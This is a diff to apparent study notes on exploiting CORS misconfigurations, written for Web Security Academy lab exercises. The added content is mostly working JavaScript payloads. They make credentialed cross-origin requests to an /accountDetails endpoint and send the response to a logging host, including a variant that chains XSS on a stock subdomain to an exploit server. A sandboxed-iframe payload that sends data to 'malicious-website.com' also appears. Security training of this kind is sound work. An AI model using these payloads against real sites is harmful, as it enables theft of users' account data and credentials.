@@ -27,6 +27,19 @@ function reqListener() {
 };
 
 
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        location='/log?key='+this.responseText;
+    };
+</script>
+
+
 Errors parsing Origin headers:
 normal-website.com
 hackersnormal-website.com
@@ -40,6 +53,8 @@ Sandboxed cross-origin requests
 
 Some applications might whitelist the null origin to support local development of the application
 using a sandboxed iframe cross-origin request of the form:
+
+
 <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
 var req = new XMLHttpRequest();
 req.onload = reqListener;
@@ -53,3 +68,18 @@ location='malicious-website.com/log?key='+this.responseText;
 </script>"></iframe>
 
 
+Exploiting XSS via CORS trust relationships:
+
+
+<script>
+document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+
+
+Access-Control-Allow-Credentials: true
+Without that header, the victim user's browser will refuse to send their cookies, meaning the attacker will only gain access to unauthenticated content
+
+Intranets:
+GET /reader?url=doc1.pdf
+Host: intranet.normal-website.com
+Origin: https://normal-website.com
